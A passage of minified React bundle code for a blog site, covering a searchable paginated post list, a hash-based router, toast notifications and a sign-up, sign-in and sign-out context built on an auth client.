${P}`}),x.jsx("h1",{className:`text-4xl md:text-5xl font-bold mb-6 ${P}`,children:"All Blog Posts"}),x.jsx("p",{className:`text-lg md:text-xl ${T} max-w-3xl mx-auto mb-10`,children:"Browse through our entire collection of articles. Use the search to find specific topics."}),x.jsxs("div",{className:"relative max-w-xl mx-auto group",children:[x.jsx(Sg,{className:`absolute left-4 top-1/2 transform -translate-y-1/2 h-5 w-5 ${L} transition-colors`}),x.jsx(aa,{type:"search",placeholder:"Search all articles...",className:`w-full py-3 pl-12 pr-10 rounded-lg border outline-none transition-all ${C}`,value:i,onChange:m}),i&&x.jsx("button",{onClick:y,className:"absolute right-3 top-1/2 transform -translate-y-1/2 text-muted-foreground hover:text-foreground transition-colors","aria-label":"Clear search",children:x.jsx(Uo,{size:20})})]})]}),i&&h.length>0&&x.jsxs(et.div,{initial:{opacity:0},animate:{opacity:1},className:"text-center mb-8",children:[x.jsxs("h2",{className:"text-2xl font-semibold text-foreground",children:["Search Results for: ",x.jsx("span",{className:"text-primary",children:i})]}),x.jsxs("p",{className:"text-muted-foreground",children:[h.length," post(s) found."]})]}),h.length===0&&x.jsxs(et.div,{initial:{opacity:0,y:10},animate:{opacity:1,y:0},className:"text-center py-10",children:[x.jsx(Uo,{size:48,className:"mx-auto text-destructive mb-4"}),x.jsx("h2",{className:"text-2xl font-semibold text-foreground mb-2",children:"No Articles Found"}),x.jsx("p",{className:"text-muted-foreground",children:i?`Sorry, we couldn't find any articles matching "${i}". Try a different search term.`:"There are no articles available at the moment. Check back soon!"})]}),c.length>0&&x.jsx(et.section,{variants:v,initial:"hidden",animate:"visible",className:"grid grid-cols-1 md:grid-cols-2 lg:grid-cols-3 gap-6 md:gap-8",children:c.map(R=>x.jsx(dy,{post:R},R.id))}),p>1&&c.length>0&&x.jsx(l3,{currentPage:s,totalPages:p,onPageChange:f})]})},d3=()=>{const[i,t]=S.useState(window.location.hash||"#/"),[r,s]=S.useState(null),[a,c]=S.useState("");S.useEffect(()=>{const p=()=>{const f=window.location.hash||"#/";t(f),f.startsWith("#/post/")?s(f.substring(7)):s(null)};return window.addEventListener("hashchange",p),p(),()=>{window.removeEventListener("hashchange",p)}},[]);const d=S.useCallback(p=>{c(p)},[]),h=()=>{let p,f={};return i==="#/"||i==="#"?(p=I2,f={searchTerm:a,setSearchTerm:d}):i==="#/all-blogs"?(p=c3,f={searchTerm:a,setSearchTerm:d}):i.startsWith("#/post/")&&r?(p=a3,f={postId:r}):p=uy,x.jsx(p,{...f})};return x.jsx(G1,{routeKey:i,children:h()})},u3=mT,Qy=Ee.forwardRef(({className:i,...t},r)=>x.jsx(jy,{ref:r,className:yt("fixed top-0 z-[100] flex max-h-screen w-full flex-col-reverse p-4 sm:bottom-0 sm:right-0 sm:top-auto sm:flex-col md:max-w-[420px]",i),...t}));Qy.displayName=jy.displayName;const h3=cy("data-[swipe=move]:transition-none group relative pointer-events-auto flex w-full items-center justify-between space-x-4 overflow-hidden rounded-md border p-6 pr-8 shadow-lg transition-all data-[swipe=move]:translate-x-[var(--radix-toast-swipe-move-x)] data-[swipe=cancel]:translate-x-0 data-[swipe=end]:translate-x-[var(--radix-toast-swipe-end-x)] data-[state=open]:animate-in data-[state=closed]:animate-out data-[swipe=end]:animate-out data-[state=closed]:fade-out-80 data-[state=open]:slide-in-from-top-full data-[state=open]:sm:slide-in-from-bottom-full data-[state=closed]:slide-out-to-right-full",{variants:{variant:{default:"bg-background border",destructive:"group destructive border-destructive bg-destructive text-destructive-foreground"}},defaultVariants:{variant:"default"}}),Yy=Ee.forwardRef(({className:i,variant:t,...r},s)=>x.jsx(Oy,{ref:s,className:yt(h3({variant:t}),i),...r}));Yy.displayName=Oy.displayName;const p3=Ee.forwardRef(({className:i,...t},r)=>x.jsx(Ny,{ref:r,className:yt("inline-flex h-8 shrink-0 items-center justify-center rounded-md border bg-transparent px-3 text-sm font-medium ring-offset-background transition-colors hover:bg-secondary focus:outline-none focus:ring-2 focus:ring-ring focus:ring-offset-2 disabled:pointer-events-none disabled:opacity-50 group-[.destructive]:border-destructive/30 group-[.destructive]:hover:border-destructive/30 group-[.destructive]:hover:bg-destructive group-[.destructive]:hover:text-destructive-foreground group-[.destructive]:focus:ring-destructive",i),...t}));p3.displayName=Ny.displayName;const Xy=Ee.forwardRef(({className:i,...t},r)=>x.jsx(Fy,{ref:r,className:yt("absolute right-2 top-2 rounded-md p-1 text-foreground/50 opacity-0 transition-opacity hover:text-foreground focus:opacity-100 focus:outline-none focus:ring-2 group-hover:opacity-100 group-[.destructive]:text-red-300 group-[.destructive]:hover:text-red-50 group-[.destructive]:focus:ring-red-400 group-[.destructive]:focus:ring-offset-red-600",i),"toast-close":"",...t,children:x.jsx(Aw,{className:"h-4 w-4"})}));Xy.displayName=Fy.displayName;const Zy=Ee.forwardRef(({className:i,...t},r)=>x.jsx(Ly,{ref:r,className:yt("text-sm font-semibold",i),...t}));Zy.displayName=Ly.displayName;const eb=Ee.forwardRef(({className:i,...t},r)=>x.jsx(By,{ref:r,className:yt("text-sm opacity-90",i),...t}));eb.displayName=By.displayName;function f3(){const{toasts:i}=Od();return x.jsxs(u3,{children:[i.map(({id:t,title:r,description:s,action:a,...c})=>x.jsxs(Yy,{...c,children:[x.jsxs("div",{className:"grid gap-1",children:[r&&x.jsx(Zy,{children:r}),s&&x.jsx(eb,{children:s})]}),a,x.jsx(Xy,{})]},t)),x.jsx(Qy,{})]})}const g3=S.createContext(void 0),m3=({children:i})=>{const{toast:t}=Od(),[r,s]=S.useState(null),[a,c]=S.useState(null),[d,h]=S.useState(!0),p=S.useCallback(async w=>{c(w),s(w?.user??null),h(!1)},[]);S.useEffect(()=>{(async()=>{const{data:{session:T}}=await qe.auth.getSession();p(T)})();const{data:{subscription:P}}=qe.auth.onAuthStateChange(async(T,C)=>{p(C)});return()=>P.unsubscribe()},[p]);const f=S.useCallback(async(w,P,T)=>{const{error:C}=await qe.auth.signUp({email:w,password:P,options:T});return C&&t({variant:"destructive",title:"Sign up Failed",description:C.message||"Something went wrong"}),{error:C}},[t]),m=S.useCallback(async(w,P)=>{const{error:T}=await qe.auth.signInWithPassword({email:w,password:P});return T&&t({variant:"destructive",title:"Sign in Failed",description:T.message||"Something went wrong"}),{error:T}},[t]),y=S.useCallback(async()=>{const{error:w}=await qe.auth.signOut();return w&&t({variant:"destructive",title:"Sign out Failed",description:w.message||"Something went wrong"}),{error:w}},[t]),v=S.useMemo(()=>({user:r,session:a,loading:d,signUp:f,signIn:m,signOut:y}),[r,a,d,f,m,y]);return x.jsx(g3.Provider,{value:v,children:i})};aw.createRoot(document.getElementById("root")).render(x.jsx(Ee.StrictMode,{children:x.jsxs(W1,{defaultTheme:"light",storageKey:"cyberblog-theme",children:[x.jsx(m3,{children:x.jsx(d3,{})}),x.jsx(f3,{})]})}));export{id as g};
